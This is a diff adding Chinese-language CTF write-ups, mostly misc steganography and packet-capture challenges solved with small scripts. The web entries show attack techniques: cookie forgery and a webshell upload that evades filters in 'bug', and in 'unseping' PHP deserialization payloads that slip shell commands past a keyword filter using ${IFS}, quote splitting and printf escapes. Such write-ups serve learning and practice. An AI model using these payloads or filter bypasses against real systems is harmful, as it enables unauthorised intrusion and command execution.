@@ -161,6 +161,270 @@ StegSolve打开，即可得到flag：
 
 brainfuck解码
 
+### 19. János-the-Ripper
+
+010打开是zip文件头，修改后缀解压需要密码，ARCHPR爆破得到密码解压得到flag；
+
+### 20. reverseMe
+
+反转图片即可
+
+### 21. Aesop_secret
+
+将gif图片逐帧分解，拼接在一起，得到一张图片：
+
+![image-20240103094521347](adword_wp.assets/image-20240103094521347.png)
+
+010打开gif，文件尾AES解码两次，ISCC为key得到flag
+
+![image-20240103094618708](adword_wp.assets/image-20240103094618708.png)
+
+### 22. a_good_idea
+
+binwalk分离得到一个压缩包：
+
+```shell
+binwalk a_very_good_idea.jpg -e --run-as=root
+```
+
+![image-20240103095529836](adword_wp.assets/image-20240103095529836.png)
+
+解压是两张图片和一个提示：
+
+```
+try to find the secret of pixels
+```
+
+Beyond Compare比较下：
+
+![image-20240103095709781](adword_wp.assets/image-20240103095709781.png)
+
+得到一个二维码，扫描即可得到flag
+
+### 23. 2017_Dating_in_Singapore
+
+数字按照短横线分成12个部分，在给的日历上画出来就是flag
+
+### 24. embarrass
+
+010打开，搜索flag
+
+### 25. 适合作为桌面
+
+Stegsolve打开，有一个二维码，扫码得到一串字符串，010：
+
+![image-20240103140523171](adword_wp.assets/image-20240103140523171.png)
+
+存在1.py、1.pyt等关键字，应该是pyc文件，保存为.pyc，使用EasyPythonDecompiler反编译得到源代码：
+
+```python
+# Embedded file name: 1.py
+
+
+def flag():
+    str = [102,
+     108,
+     97,
+     103,
+     123,
+     51,
+     56,
+     97,
+     53,
+     55,
+     48,
+     51,
+     50,
+     48,
+     56,
+     53,
+     52,
+     52,
+     49,
+     101,
+     55,
+     125]
+    flag = ''
+    for i in str:
+        flag += chr(i)
+
+    print flag
+```
+
+运行得到flag
+
+### 26. 神奇的Modbus
+
+找到Modbus协议的记录，追踪tcp流得到flag：
+
+![image-20240103141600491](adword_wp.assets/image-20240103141600491.png)
+
+注意要加个o
+
+### 27. something_in_image
+
+010打开搜索flag即可
+
+### 28. simple_transfer
+
+大鲨鱼打开，选择统计-->协议分级，看哪些协议的数据占比多：
+
+![image-20240103142847477](adword_wp.assets/image-20240103142847477.png)
+
+然而过滤完毕这个DLEP以后并没有什么有用的信息，去kali中foremost分解下：
+
+```shell
+foremost -t all -i f9809647382a42e5bfb64d7d447b4099.pcap 
+```
+
+### 29. What-is-this
+
+Beyond Compare图片比较一下：
+
+![image-20240103143556456](adword_wp.assets/image-20240103143556456.png)
+
+### 30. 心仪的公司
+
+大鲨鱼打开搜索shell
+
+![image-20240103144114994](adword_wp.assets/image-20240103144114994.png)
+
+或者使用strings命令：
+
+```shell
+strings webshell.pcapng | grep "{"
+```
+
+
+
+![image-20240103144304612](adword_wp.assets/image-20240103144304612.png)
+
+### 31. easycap
+
+大鲨鱼tcp追踪流得到flag
+
+### 32. Nepnep 祝你新年快乐啦！
+
+看视频最后有flag
+
+### 33. hit-the-core
+
+去kali中使用strings扫描下：
+
+```shell
+strings 8deb5f0c2cd84143807b6175f58d6f3f.core |grep {.*}
+```
+
+得到：
+
+```
+cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc{bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv}
+```
+
+使用脚本每隔四位提取：
+
+```python
+str="cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc{bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv}"
+flag=""
+#range()函数，从3开始，到str的长度结束，i的每一次变化，步长为5
+for i in range(3,len(str),5):
+    flag=flag+str[i]
+print(flag)
+```
+
+得到flag
+
+### 34. glance-50
+
+需要将gif图片的每一帧抽取出来然后再拼接在一起，使用python脚本：
+
+```python
+from PIL import Image
+import os
+
+
+def get_gif_frame(gif_location):
+    """
+    将gif每一帧抽取出来
+    :param gif_location: gif的文件路径
+    :return: PIL图像对象和current指针
+    """
+    im = Image.open(gif_location)
+    while True:
+        current = im.tell()
+        im.save('prtemp/res/' + str(current) + '.png')
+        # 为什么-1，是放置文件指针便利到最后一个，+1后空对象
+        if current < im.n_frames - 1:
+            im.seek(current + 1)
+        else:
+            break
+    return im, current
+
+
+def image_compose(im, current):
+    """
+    将每一帧图片组合，得到最终的图片
+    :param im: PIL图像对象
+    :param current: current指针，为了确定画布的宽度
+    :return: 得到最终合成图
+    """
+    to_image = Image.new('RGB', (im.size[0] * current, im.size[1]))  # 创建一个新图
+    # 循环遍历，把每张图片按顺序粘贴到对应位置上
+    flag = 0
+    for name in img_list:
+        ph = Image.open('./prtemp/res/' + name)
+        to_image.paste(ph, (flag, 0))
+        flag += im.size[0]
+    return to_image.save('./prtemp/result.png')  # 保存新图
+
+
+im, current = get_gif_frame("prtemp/9266eadf353d4ada94ededaeb96d0c50.gif")
+
+# 得到图片的文件序，防止粘贴图片时候拼错
+img_list = os.listdir('./prtemp/res')
+img_list.sort(key=lambda x: int(x[:-4]))  # 得到帧文件的文件顺序
+
+image_compose(im, current)
+
+```
+
+得到flag
+
+![image-20240103150018217](adword_wp.assets/image-20240103150018217.png)
+
+### 35. Erik-Baleog-and-Olaf
+
+Stegsolve打开调整中间有个二维码，扫描即得flag
+
+### 36. Ditf
+
+010打开，发现报crc错误，使用脚本看下正确的宽高，tweakPNG修改：
+
+```python
+import os
+import binascii
+import struct
+
+crcbp = open("e02c9de40be145dba6baa80ef1d270ba.png","rb").read()
+for i in range(2000):
+    for j in range(2000):
+        data = crcbp[12:16] + struct.pack('>i',i) + struct.pack('>i',j)+crcbp[24:29]
+        crc32 = binascii.crc32(data) & 0xffffffff
+        if(crc32 == 0x38165a34):
+            print(i,j)
+            print('hex:',hex(i),hex(j))
+```
+
+得到一串代码：
+
+![image-20240103152711137](adword_wp.assets/image-20240103152711137.png)
+
+binwalk分离，得到一个压缩包，使用上面的代码作为密码解压得到流量包文件，大鲨鱼打开，搜索png追踪http流：
+
+![image-20240103152817052](adword_wp.assets/image-20240103152817052.png)
+
+base64解码即可得到flag；
+
 
 
 ## Web
@@ -2298,9 +2562,260 @@ if __name__ == "__main__":
 
 爆破得到密码，登录admin即可得到flag
 
-### bug
+### 40. bug
 
-### unseping
+尝试是SQL注入行不通，注册一个账号进行登录：
+
+![image-20240103100812808](adword_wp.assets/image-20240103100812808.png)
+
+有模块提示：
+
+![image-20240103100906035](adword_wp.assets/image-20240103100906035.png)
+
+所有现在需要破解/修改出admin用户的密码进行登录，点击Personal，burp抓包看看：
+
+![image-20240103101041013](adword_wp.assets/image-20240103101041013.png)
+
+百度了一种wp根据cookie的user值是uid:Username的md5加密，例如上图就是5:a的md5加密：
+
+![image-20240103101318172](adword_wp.assets/image-20240103101318172.png)
+
+那么将此修改为1:admin的md5加密即可查看到admin的用户信息(4b9987ccafacb8d8fc08d22bbca797ba)：
+
+![image-20240103101401689](adword_wp.assets/image-20240103101401689.png)
+
+![image-20240103101455320](adword_wp.assets/image-20240103101455320.png)
+
+根据以上用户信息即可修改密码，此外还有另外一种修改admin密码的方法，点击Findpwd，输入刚刚注册的用户信息，然后抓包：
+
+![image-20240103101927093](adword_wp.assets/image-20240103101927093.png)
+
+![image-20240103101957868](adword_wp.assets/image-20240103101957868.png)
+
+将username修改为admin即可，然后登录，继续点击manage发现提示：
+
+![image-20240103102222368](adword_wp.assets/image-20240103102222368.png)
+
+需要抓包修改xff（X-Forwarded-For: 127.0.0.1）：
+
+![image-20240103102357918](adword_wp.assets/image-20240103102357918.png)
+
+源码有提示：
+
+```html
+</div>
+<!-- index.php?module=filemanage&do=???-->
+</body>
+```
+
+构造payload：
+
+```
+/index.php?module=filemanage&do=upload
+```
+
+得到页面：
+
+![image-20240103102725297](adword_wp.assets/image-20240103102725297.png)
+
+上传一个一句话，试验发现存在文件名黑名单过滤和 Content-Type 判断，文件内容还会过滤 PHP 的语法。抓包修改后缀为 “php5”，Content-Type 为 “image/jpeg”，并在 post 数据中将 PHP 一句话木马改为用 JavaScript 表示：
+
+![image-20240103103058202](adword_wp.assets/image-20240103103058202.png)
+
+得到flag
+
+### 41. unseping
+
+代码审计：
+
+```php
+ <?php
+highlight_file(__FILE__);
+
+class ease{
+    
+    private $method;
+    private $args;
+    function __construct($method, $args) {
+        $this->method = $method;
+        $this->args = $args;
+    }
+ 
+    function __destruct(){
+        if (in_array($this->method, array("ping"))) {
+            call_user_func_array(array($this, $this->method), $this->args);
+        }
+    } 
+ 
+    function ping($ip){
+        exec($ip, $result);
+        var_dump($result);
+    }
+
+    function waf($str){
+        if (!preg_match_all("/(\||&|;| |\/|cat|flag|tac|php|ls)/", $str, $pat_array)) {
+            return $str;
+        } else {
+            echo "don't hack";
+        }
+    }
+ 
+    function __wakeup(){
+        foreach($this->args as $k => $v) {
+            $this->args[$k] = $this->waf($v);
+        }
+    }   
+}
+
+$ctf=@$_POST['ctf'];
+@unserialize(base64_decode($ctf));
+?>
+
+```
+
+- 基本执行顺序：post传参，base64编码，反序列化，调用__wakeup()魔术方法，执行waf()方法过滤，调用析构方法()；
+- __wakeup方法，该方法使用waf方法对$arg中的内容进行了防护，过滤掉了|  &  ;  空格  /  cat  flag  tac  php  ls。
+- `if (in_array($this->method, array("ping")))`：想要执行call这个函数就必须满足if条件：`in_array(需要搜索的字符串，在哪个数组中搜)`是一个搜索函数。题目在ping数组中搜索$a中的method的值，如果等于ping，就执行call函数，那么我们**确定 method的值为ping**；
+- `call_user_func_array(array($this, $this->method), $this->args);`
+  - 先分析第一个参数：array($this,$this->method) 第一个$this是为了符合语法规范，第二个$this->method表示调用method这个函数，当method=ping，就是调用后面的ping函数，正好能够达成执行ping函数的要求。于是更加确定了method的值一定是ping；
+  - 第二个参数语法要求一定是一个数组，但是它这里仅仅$this->args表示，**那么args也一定是一个数组，**具体的值是多少呢？call函数第二个参数是给传参用的，传给第一个参数所调用的函数，也就是ping函数；
+
+
+
+---
+
+
+
+**exec()函数**
+
+用于执行一个外部程序，调用linux命令的函数，语法为：
+
+```php
+exec(string $command[,array &$output[,int &$return_var ]]);
+```
+
+- $command 为要执行得命令，为字符类型
+- $output 为执行命令后输出的结果，为数组类型
+- $return_var 为命令执行后的返回状态，为int类型
+- 理论上只需要一个参数$command即可
+
+**call_user_func_array** 函数
+
+```php
+call_user_func_array ( callable $callback , array $param_arr )
+```
+
+把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入；
+
+**printf绕过（字符串进制绕过）**
+
+printf的格式化输出，可以将十六进制或者八进制的字符数字转化成其对应的ASCII字符内容输出。其格式为：
+
+```
+\NNN 八进制数 NNN 所代表的 ASCII 码字符。
+
+\xHH 十六进制 HH 对应的8位字符。HH 可以是一到两位。
+
+\uHHHH 十六进制 HHHH 对应的 Unicode 字符。HHHH 一到四位。
+
+\UHHHHHHHH十六进制 HHHHHHHH 对应的 Unicode 字符。HHHHHHHH 一到八位
+```
+
+![image-20240103114036554](adword_wp.assets/image-20240103114036554.png)
+
+在bash中，$( )与反引号都是用来作命令替换的，执行括号或者反引号中的命令。命令替换与变量替换差不多，先完成引号里的命令行，然后将其执行结果作为替换，再重组成新的命令行进行执行。
+
+空格绕过：
+
+```shell
+cat${IFS}flag.txt
+cat$IFS$9flag.txt
+cat<flag.txt
+cat<>flag.txt
+```
+
+
+
+---
+
+
+
+ls查看：
+
+```php
+<?php
+class ease{
+    private $method;
+    private $args;
+    function __construct($method, $args) {
+        $this->method = $method;
+        $this->args = $args;
+    }
+}
+$a = new ease("ping",array("l''s"));
+$str = serialize($a);
+var_dump($str);
+var_dump(base64_encode($str));
+?>
+```
+
+跑脚本获得payload，ls使用空字符''绕过，**ls-->l''s**；
+
+![image-20240103112433039](adword_wp.assets/image-20240103112433039.png)
+
+
+
+返回的数组里面保存了ls命令执行的结果，可以看到里面有两个文件：flag_1s_here和index.php。**那么接下来需要访问到flag_1s_here。flag_1s_here没有后缀，那么它很可能是一个文件夹，还需要ls一遍，同样是对args参数进行操作**，空格使用${IFS}绕过，flag同样使用空字符绕过：
+
+```php
+<?php
+class ease{
+    private $method;
+    private $args;
+    function __construct($method, $args) {
+        $this->method = $method;
+        $this->args = $args;
+    }
+}
+$a = new ease("ping",array('l""s${IFS}f""lag_1s_here'));
+$str = serialize($a);
+var_dump($str);
+var_dump(base64_encode($str));
+?>
+```
+
+- 这里注意细节：array里面的的引号是单引号；单引号会把里面的内容完全当成字符串，而双引号会进行解析，如果用双引号会导致${IFS}报错。
+
+
+
+![image-20240103112602154](adword_wp.assets/image-20240103112602154.png)
+
+最后得读取这串flag：`cat flag_1s_here/flag_831b69012c67b35f.php`，一样进行绕过：
+
+- flag：f""lag；
+- 空格：${IFS}；
+- /：printf及$()，$(printf${IFS}"\57");
+- cat：c""at;
+- php：p""hp
+
+```php
+<?php
+class ease{
+    private $method;
+    private $args;
+    function __construct($method, $args) {
+        $this->method = $method;
+        $this->args = $args;
+    }
+}
+$a = new ease("ping",array('c""at${IFS}f""lag_1s_here$(printf${IFS}"\57")f""lag_831b69012c67b35f.p""hp'));
+$str = serialize($a);
+var_dump($str);
+var_dump(base64_encode($str));
+?>
+```
+
+![image-20240103112843266](adword_wp.assets/image-20240103112843266.png)
 
 ### Confusion1
 
